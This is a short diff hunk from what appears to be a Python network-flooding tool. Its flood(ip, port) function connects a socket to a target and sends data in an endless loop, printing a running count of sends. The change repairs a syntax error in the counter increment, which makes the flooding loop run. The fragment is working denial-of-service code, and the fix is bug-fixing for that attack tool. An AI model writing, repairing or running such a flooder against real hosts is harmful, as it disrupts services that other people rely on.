@@ -28,7 +28,7 @@ def flood(ip, port):
                 s.connect((ip, port))
                 while True:
                     s.send(bytes)
-                    cnt ,= 1
+                    cnt += 1
                     if cnt % 5000 == 0:
                         print(Fore.RED , str(cnt) , " sockets sent" , Fore.RESET)
             else:
